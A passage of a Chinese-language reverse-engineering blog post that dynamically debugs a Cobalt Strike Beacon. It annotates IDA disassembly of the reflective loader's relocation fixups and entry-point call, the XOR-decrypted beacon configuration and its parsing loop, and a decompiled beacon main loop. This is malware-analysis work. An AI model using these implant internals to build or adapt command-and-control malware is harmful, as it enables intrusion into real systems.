class="number">10</span>h]  ; 重装载PE文件重定位表位置</span><br><span class="line">		debug085:<span class="number">0000000003267387</span>                 mov     eax, [rax+<span class="number">4</span>]    ; 重装载PE文件重定位表SizeOfBlock位置</span><br><span class="line">		debug085:<span class="number">000000000326738</span>A                 mov     rcx, [rsp+<span class="number">10</span>h]  ; 重装载PE文件重定位表位置</span><br><span class="line">		debug085:<span class="number">000000000326738F</span>                 add     rcx, rax        ; 下一个重定位表位置</span><br><span class="line">		debug085:<span class="number">0000000003267392</span>                 mov     rax, rcx</span><br><span class="line">		debug085:<span class="number">0000000003267395</span>                 mov     [rsp+<span class="number">10</span>h], rax  ; 下一个重定位表位置存到[rsp+<span class="number">10</span>h]</span><br><span class="line">		debug085:<span class="number">000000000326739</span>A                 jmp     loc_326717B</span><br><span class="line">		debug085:<span class="number">000000000326739F</span> ; ---------------------------------------------------------------------------</span><br><span class="line">debug085:<span class="number">00000000032671</span>EC                 mov     rax, [rsp]      ; 重装载PE文件重定位表子偏移地址位置</span><br><span class="line">debug085:<span class="number">00000000032671F</span>0                 movzx   eax, word ptr [rax] ; 子偏移地址 A658h</span><br><span class="line">debug085:<span class="number">00000000032671F</span>3                 shr     ax, <span class="number">0</span>Ch         ; AX右移<span class="number">0</span>Ch左侧补<span class="number">0</span></span><br><span class="line">debug085:<span class="number">00000000032671F</span>7                 and     ax, <span class="number">0F</span>h</span><br><span class="line">debug085:<span class="number">00000000032671F</span>B                 movzx   eax, ax</span><br><span class="line">debug085:<span class="number">00000000032671F</span>E                 cmp     eax, <span class="number">0</span>Ah        ; BaseRelocationType=Ah(<span class="number">10</span>);IMAGE_REL_BASED_DIR64</span><br><span class="line">debug085:<span class="number">0000000003267201</span>                 jnz     <span class="type">short</span> loc_3267249</span><br><span class="line">debug085:<span class="number">0000000003267203</span>                 mov     eax, <span class="number">0F</span>FFh</span><br><span class="line">debug085:<span class="number">0000000003267208</span>                 mov     rcx, [rsp]      ; 重装载PE文件重定位表子偏移地址位置</span><br><span class="line">debug085:<span class="number">000000000326720</span>C                 movzx   ecx, word ptr [rcx] ; 子偏移地址 A658h</span><br><span class="line">debug085:<span class="number">000000000326720F</span>                 and     cx, ax          ; 用与运算取低十二位 <span class="number">658</span>h</span><br><span class="line">debug085:<span class="number">0000000003267212</span>                 movzx   eax, cx</span><br><span class="line">debug085:<span class="number">0000000003267215</span>                 movzx   eax, ax</span><br><span class="line">debug085:<span class="number">0000000003267218</span>                 mov     rcx, [rsp+<span class="number">8</span>]    ; 重装载PE文件重定位表基地址</span><br><span class="line">debug085:<span class="number">000000000326721</span>D                 mov     rax, [rcx+rax]  ; [rcx+rax]=[RVA+子偏移地址]=[<span class="number">1B</span>C658h]=<span class="number">18001</span>C8C8h</span><br><span class="line">debug085:<span class="number">0000000003267221</span>                 add     rax, [rsp+<span class="number">20</span>h]  ; RAX+重定位差值(FFFFFFFE80190000h)=<span class="number">1</span>AC8C8h</span><br><span class="line">debug085:<span class="number">0000000003267226</span>                 mov     ecx, <span class="number">0F</span>FFh</span><br><span class="line">debug085:<span class="number">000000000326722B</span>                 mov     rdx, [rsp]      ; 重装载PE文件重定位表子偏移地址位置</span><br><span class="line">debug085:<span class="number">000000000326722F</span>                 movzx   edx, word ptr [rdx]</span><br><span class="line">debug085:<span class="number">0000000003267232</span>                 and     dx, cx</span><br><span class="line">debug085:<span class="number">0000000003267235</span>                 movzx   ecx, dx</span><br><span class="line">debug085:<span class="number">0000000003267238</span>                 movzx   ecx, cx</span><br><span class="line">debug085:<span class="number">000000000326723B</span>                 mov     rdx, [rsp+<span class="number">8</span>]    ; 重装载PE文件重定位表存储地址：<span class="number">1B</span>C000h</span><br><span class="line">debug085:<span class="number">0000000003267240</span>                 mov     [rdx+rcx], rax  ; [<span class="number">1B</span>C658h]=<span class="number">1</span>AC8C8h，修改偏移</span><br><span class="line">debug085:<span class="number">0000000003267244</span>                 jmp     loc_3267371</span><br><span class="line">debug085:<span class="number">0000000003267249</span> ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>loc_3267249，标识值为3h(0111b)的偏移地址；IMAGE_REL_BASED_HIGHLOW</p>
<p>loc_32672A3，标识值为1h(0001b)的偏移地址；IMAGE_REL_BASED_HIGH</p>
<p>loc_326730D，标识值为2h(0010b)的偏移地址；IMAGE_REL_BASED_LOW</p>
<p>loc_326739F，返回</p>
<p>‍</p>
<h3 id="堆栈与临储清理，修改入口点"><a href="#堆栈与临储清理，修改入口点" class="headerlink" title="堆栈与临储清理，修改入口点"></a>堆栈与临储清理，修改入口点</h3><p>临储区清理：</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812175912-m1qlxkv.png" alt="image" loading="lazy">​</p>
<p>入口点修改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">debug085:<span class="number">000000000326631</span>E                 mov     rax, [rsp+<span class="number">38</span>h]  ; 源PE文件：PE头</span><br><span class="line">debug085:<span class="number">0000000003266323</span>                 movzx   eax, word ptr [rax+<span class="number">16</span>h] ; FILE_CHARACTERISTICSCharacteristics:A022h</span><br><span class="line">debug085:<span class="number">0000000003266327</span>                 and     eax, <span class="number">1000</span>h</span><br><span class="line">debug085:<span class="number">000000000326632</span>C                 cmp     eax, <span class="number">1000</span>h</span><br><span class="line">debug085:<span class="number">0000000003266331</span>                 jnz     <span class="type">short</span> loc_3266350</span><br><span class="line">		debug085:<span class="number">0000000003266350</span> ; ---------------------------------------------------------------------------</span><br><span class="line">		debug085:<span class="number">0000000003266350</span></span><br><span class="line">		debug085:<span class="number">0000000003266350</span> loc_3266350:                            ; CODE XREF: debug085:<span class="number">0000000003266331</span>↑j</span><br><span class="line">		debug085:<span class="number">0000000003266350</span>                 mov     rax, [rsp+<span class="number">38</span>h]  ; 源PE文件：PE头</span><br><span class="line">		debug085:<span class="number">0000000003266355</span>                 mov     eax, [rax+<span class="number">28</span>h]  ; AddressOfEntryPoint</span><br><span class="line">		debug085:<span class="number">0000000003266358</span>                 mov     rcx, [rsp+<span class="number">40</span>h]  ; 重装载PE文件内存首地址</span><br><span class="line">		debug085:<span class="number">000000000326635</span>D                 add     rcx, rax        ; 计算出的入口点</span><br><span class="line">		debug085:<span class="number">0000000003266360</span>                 mov     rax, rcx</span><br><span class="line">		debug085:<span class="number">0000000003266363</span>                 mov     [rsp+<span class="number">60</span>h], rax  ; 重装载PE文件入口点</span><br><span class="line">		debug085:<span class="number">0000000003266368</span></span><br><span class="line">		debug085:<span class="number">0000000003266368</span> loc_3266368:                            ; CODE XREF: debug085:<span class="number">000000000326634</span>E↑j</span><br><span class="line">		debug085:<span class="number">0000000003266368</span>                 mov     r8, [rsp+<span class="number">0E0</span>h]</span><br><span class="line">		debug085:<span class="number">0000000003266370</span>                 mov     edx, <span class="number">1</span></span><br><span class="line">		debug085:<span class="number">0000000003266375</span>                 mov     rcx, [rsp+<span class="number">40</span>h]  ; 重装载PE文件内存首地址(<span class="number">0x03650000</span>h)</span><br><span class="line">		debug085:<span class="number">000000000326637</span>A                 call    qword ptr [rsp+<span class="number">60</span>h] ; 执行重装载PE文件</span><br><span class="line">		debug085:<span class="number">000000000326637</span>E                 mov     rax, [rsp+<span class="number">60</span>h]</span><br><span class="line">		debug085:<span class="number">0000000003266383</span>                 add     rsp, <span class="number">0</span>D0h</span><br><span class="line">		debug085:<span class="number">000000000326638</span>A                 pop     rdi</span><br><span class="line">		debug085:<span class="number">000000000326638B</span>                 retn</span><br><span class="line">		debug085:<span class="number">000000000326638B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812180429-0716hle.png" alt="image" loading="lazy">​</p>
<p>到这里远程文件的下载和装载都已经完成</p>
<p>‍</p>
<h2 id="装载文件运行"><a href="#装载文件运行" class="headerlink" title="装载文件运行"></a>装载文件运行</h2><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812210111-ewc5ixy.png" alt="image" loading="lazy">​</p>
<p>查看提取出的PE文件，发现入口点修改的结果</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240812210241-zque1io.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="DLL的入口点调用与初始化"><a href="#DLL的入口点调用与初始化" class="headerlink" title="DLL的入口点调用与初始化"></a><strong>DLL的入口点调用与初始化</strong></h3><h4 id="用户定义的dll入口点函数-DllMain"><a href="#用户定义的dll入口点函数-DllMain" class="headerlink" title="用户定义的dll入口点函数:DllMain()"></a>用户定义的dll入口点函数:DllMain()</h4><p>用户定义的dll入口点函数，用于beacon.dll初始化</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813122910-lxosu1a.png" alt="image" loading="lazy">​</p>
<p>fdwReason&#x3D;1，运行sub_18001876C()函数，推测其可能为beacon_int()函数， 进行了Beacon的初始化</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813133026-z4e0gmx.png" alt="image" loading="lazy">​</p>
<p>当fdwReason&#x3D;4时，程序将运行sub_18000CA74()函数，推测其可能为beacon的主功能函数， 进行上线，等候任务下发</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813142358-ccr1zhg.png" alt="image" loading="lazy">​</p>
<p>动态调试beacon_init（）</p>
<p>通过上面的Dll入口点的非用户行为，直接跳转，通过分析得到call    sub_176C2C即DllMain（）</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813143715-qln8ecu.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h4 id="Beacon的初始化：Beacon-int"><a href="#Beacon的初始化：Beacon-int" class="headerlink" title="Beacon的初始化：Beacon_int()"></a>Beacon的初始化：Beacon_int()</h4><p>通过分析得知，sub_17876C（）就是Beacon_int()</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813145110-48hgzog.png" alt="image" loading="lazy">​</p>
<p>注意xor解密这里，使用了19C030h的0x1000个数据与0x2e进行xor解密</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813150306-zqui8kb.png" alt="image" loading="lazy">​</p>
<p>发现这里是解密了beacon的配置文件</p>
<p>解密完成后sub_173F08（）函数对刚解密的数据进行了操作，跟进分析这个函数的作用</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813150632-49r5evy.png" alt="image" loading="lazy">​</p>
<p>这是对解密后的数据赋值给了v10，以及存储配置文件长度</p>
<p>接下来进入while循环</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813152827-c4xyoin.png" alt="image" loading="lazy">​</p>
<p>对应beacon_Src项目参考为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = BeaconDataShort(&amp;c2profile);;index = BeaconDataShort(&amp;c2profile))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (index &lt;= <span class="number">0</span>) </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	WORD data_type = BeaconDataShort(&amp;c2profile);</span><br><span class="line">	WORD data_size = BeaconDataShort(&amp;c2profile);</span><br><span class="line">	<span class="type">int</span> size = index_size * index;</span><br><span class="line">	*(WORD*)(CsC2Config + size) = data_type;</span><br><span class="line">	<span class="keyword">switch</span> (data_type)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		*(WORD*)(CsC2Config + size + <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) =BeaconDataShort(&amp;c2profile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		*(DWORD*)(CsC2Config + size + <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) =BeaconDataInt(&amp;c2profile);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		*(ULONG_PTR*)(CsC2Config + size + <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) =(ULONG_PTR)<span class="built_in">malloc</span>(data_size);</span><br><span class="line">		<span class="type">void</span>* data = BeaconDataPtr(&amp;c2profile, data_size);</span><br><span class="line">		<span class="built_in">memcpy</span>(*(ULONG_PTR**)(CsC2Config + size + <span class="keyword">sizeof</span>(<span class="type">size_t</span>)), data,data_size);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://wbglil.github.io/2021/07/27/%E4%B8%80%E4%BB%BD%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84cobalt-strike-beacon%E4%BB%A3%E7%A0%81/">参考</a></p>
<p>而while循环中的<code>v8 = sub_173FB4(v10);</code>​就是调用BeaconDataShort()函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813153544-juiff0s.png" alt="image" loading="lazy">​</p>
<p>美化函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> <span class="title function_">BeaconDataShort</span><span class="params">(datap* parser)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> result; <span class="comment">// 用于存储解析后的短整型数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果解析缓冲区的长度小于 2 字节(sizeof(short))</span></span><br><span class="line">    <span class="keyword">if</span> (parser-&gt;length &lt; <span class="keyword">sizeof</span>(<span class="type">short</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回 0，表示解析失败</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从解析缓冲区中读取 2 字节的数据</span></span><br><span class="line">    <span class="comment">// ntohs() 函数用于将网络字节序(Big Endian)转换为主机字节序(Little Endian)</span></span><br><span class="line">    result = ntohs(*(u_short*)parser-&gt;buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将解析缓冲区指针向后移动 2 字节</span></span><br><span class="line">    parser-&gt;buffer += <span class="keyword">sizeof</span>(<span class="type">short</span>);</span><br><span class="line">    <span class="comment">// 将解析缓冲区的剩余长度减少 2 字节</span></span><br><span class="line">    parser-&gt;length -= <span class="keyword">sizeof</span>(<span class="type">short</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result; <span class="comment">// 返回解析后的短整型数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来又配置了两次，直接跳过</p>
<p>执行case1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			*(WORD*)(CsC2Config + size + <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) = BeaconDataShort(&amp;c2profile);</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>将处理过的配置内容放入*(v5 + qword_1A7708 + 8)，即表达式计算出一个新的内存地址</p>
<p>程序将在此循环来处理所有读取到的配置，不同的case对应不同类型内容的处理</p>
<p>当case全部完成后，进行返回</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">memset</span>(byte_19C030, <span class="number">0</span>i64, <span class="number">4096</span>i64);<span class="comment">//将存储区归零并返回</span></span><br></pre></td></tr></table></figure>

<p>beacon_init结束后，又跳转回了原程序，fdwReason&#x3D;4调用beacon的入口点</p>
<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813160659-kw34mdc.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h4 id="正式上线：Beacon-main"><a href="#正式上线：Beacon-main" class="headerlink" title="正式上线：Beacon_main()"></a>正式上线：Beacon_main()</h4><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813161340-k3o72hu.png" alt="image" loading="lazy">​</p>
<ul>
<li><p>如果 <code>hinstDLL</code>​ 不为空,并且 <code>VirtualQuery(hinstDLL, &amp;Buffer, 0x30ui64)</code>​ 成功,则进一步检查 <code>Buffer.Type</code>​:</p>
<ul>
<li>如果 <code>Buffer.Type</code>​ 是 0x20000(MEM_IMAGE),则调用 <code>VirtualFree(hinstDLL, 0i64, 0x8000u)</code>​ 释放内存。</li>
<li>如果 <code>Buffer.Type</code>​ 是 0x40000(MEM_MAPPED),则调用 <code>UnmapViewOfFile(hinstDLL)</code>​ 取消内存映射。</li>
</ul>
</li>
<li><p>最后,调用 <code>sub_18000CA74(lpvReserved)</code>​ 函数。</p>
</li>
</ul>
<p>进入sub_18000CA74函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240813162101-0un2sd2.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1ACA74</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebp</span></span><br><span class="line">    __int64 v2; <span class="comment">// r12</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// r13d</span></span><br><span class="line">    <span class="type">int</span> v4; <span class="comment">// r14d</span></span><br><span class="line">    __int64 v5; <span class="comment">// r15</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">    <span class="type">unsigned</span> __int16 v8; <span class="comment">// ax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">    __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">    __int64 v12; <span class="comment">// rax</span></span><br><span class="line">    __int64 v13; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v16; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">int</span> v17; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">    __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v22; <span class="comment">// [rsp+30h] [rbp-48h]</span></span><br><span class="line">    __int64 v23; <span class="comment">// [rsp+88h] [rbp+10h]</span></span><br><span class="line">    __int64 v24; <span class="comment">// [rsp+90h] [rbp+18h]</span></span><br><span class="line">    __int64 v25; <span class="comment">// [rsp+98h] [rbp+20h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用一些未知的函数,可能是进行初始化或设置一些全局变量</span></span><br><span class="line">    v0 = (unk_1B3DFC)(<span class="number">640</span>i64);</span><br><span class="line">    v24 = (unk_1B3F50)(v0, <span class="number">256</span>i64);</span><br><span class="line">    (unk_1B3F50)(v0, <span class="number">256</span>i64);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    v2 = (unk_1B3F50)(v0, <span class="number">128</span>i64);</span><br><span class="line">    v25 = (unk_1B8708)(<span class="number">8</span>i64);</span><br><span class="line">    (unk_1B873C)(<span class="number">67</span>i64);</span><br><span class="line">    (unk_1B86B4)(<span class="number">68</span>i64);</span><br><span class="line">    (unk_1B86B4)(<span class="number">69</span>i64);</span><br><span class="line">    (unk_1B86B4)(<span class="number">70</span>i64);</span><br><span class="line">    (unk_1B873C)(<span class="number">1</span>i64);</span><br><span class="line">    v3 = (unk_1B873C)(<span class="number">2</span>i64);</span><br><span class="line">    v4 = (unk_1B86B4)(<span class="number">3</span>i64);</span><br><span class="line">    (unk_1B86B4)(<span class="number">19</span>i64);</span><br><span class="line">    v23 = (unk_1B8708)(<span class="number">9</span>i64);</span><br><span class="line">    v22 = (unk_1B8708)(<span class="number">10</span>i64);</span><br><span class="line">    v5 = (unk_1B9DF0)(<span class="number">16</span>i64);</span><br><span class="line">    v6 = (unk_1B86B4)(<span class="number">69</span>i64);</span><br><span class="line">    v7 = (unk_1B86B4)(<span class="number">70</span>i64);</span><br><span class="line">    LODWORD(v0) = (unk_1B86B4)(<span class="number">68</span>i64);</span><br><span class="line">    v8 = (unk_1B873C)(<span class="number">67</span>i64);</span><br><span class="line">    (unk_1B909C)(v5, v8, v0, v7, v6);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用一些可能与状态管理相关的函数</span></span><br><span class="line">    <span class="keyword">if</span> ((unk_1AE69C)())</span><br><span class="line">        sub_1B91DC();</span><br><span class="line">    dword_1DC000 = v4;</span><br><span class="line">    dword_1DE468 = (unk_1B873C)(<span class="number">5</span>i64);</span><br><span class="line">    v9 = (unk_1B86B4)(<span class="number">4</span>i64);</span><br><span class="line">    v10 = (unk_1B9DF0)(v9);</span><br><span class="line">    v11 = (unk_1B86B4)(<span class="number">4</span>i64);</span><br><span class="line">    (unk_1B3A70)(v10, v11);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进入一个循环,可能在处理某种任务或状态</span></span><br><span class="line">    <span class="keyword">while</span> (dword_1DC000)</span><br><span class="line">    &#123;</span><br><span class="line">        v12 = (unk_1B8C9C)(v25, v1, v5);</span><br><span class="line">        (unk_1BA1AC)(v2, <span class="number">128</span>i64, &amp;unk_1CC6C4, v12);</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        v13 = (unk_1B8C9C)(v25, <span class="number">0</span>i64, v5);</span><br><span class="line">        (unk_1BA1AC)(v24, <span class="number">128</span>i64, &amp;unk_1CC6C4, v13);</span><br><span class="line">        dword_1DC004 = <span class="number">1</span>;</span><br><span class="line">        (unk_1BA1AC)(&amp;unk_1E7B60, <span class="number">256</span>i64, &amp;unk_1CC6C4, v22);</span><br><span class="line">        (unk_1ADFD4)(v2, v3, v23);</span><br><span class="line">        v14 = (unk_1B86B4)(<span class="number">4</span>i64);</span><br><span class="line">        v15 = (unk_1ADF80)(v24, &amp;unk_1E7720, v10, v14);</span><br><span class="line">        v16 = v15;</span><br><span class="line">        <span class="keyword">if</span> (v15 &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v17 = (unk_1B824C)(v10, v15);</span><br><span class="line">            v16 = v17;</span><br><span class="line">            <span class="keyword">if</span> (v17 &lt;= <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                v16 = <span class="number">-1</span>;</span><br><span class="line">                v1 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                (unk_1B6654)(v10, v17);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v16 == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            (unk_1B4704)(&amp;unk_1ACDD0);</span><br><span class="line">            v18 = (unk_1B86B4)(<span class="number">28</span>i64);</span><br><span class="line">            v19 = &amp;unk_80000;</span><br><span class="line">            <span class="keyword">if</span> (v18)</span><br><span class="line">                v19 = <span class="number">4096</span>i64;</span><br><span class="line">            (unk_1B0228)(&amp;unk_1ACDD0, v19);</span><br><span class="line">            (unk_1B2F4C)(&amp;unk_1ACDD0);</span><br><span class="line">            (unk_1B29D8)(&amp;unk_1ACDD0, &amp;unk_80000);</span><br><span class="line">            <span class="keyword">if</span> ((unk_1AE69C)())</span><br><span class="line">                (unk_1AE734)(&amp;unk_1ACDD0);</span><br><span class="line">            <span class="keyword">if</span> (dword_1DE488 &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                (unk_1ADF54)();</span><br><span class="line">                (unk_1ADFD4)(v2, v3, v23);</span><br><span class="line">                (unk_1AE188)(&amp;unk_1E7B60);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        (unk_1ADF54)();</span><br><span class="line">        <span class="keyword">if</span> ((unk_1AE69C)())</span><br><span class="line">            sub_1B91DC();</span><br><span class="line">        <span class="keyword">if</span> (!dword_1DC000)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (dword_1DE468)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dword_1DC000 * dword_1DE468 / <span class="number">0x64</span>u)</span><br><span class="line">                (unk_1AE67C)();</span><br><span class="line">        &#125;</span><br><span class="line">        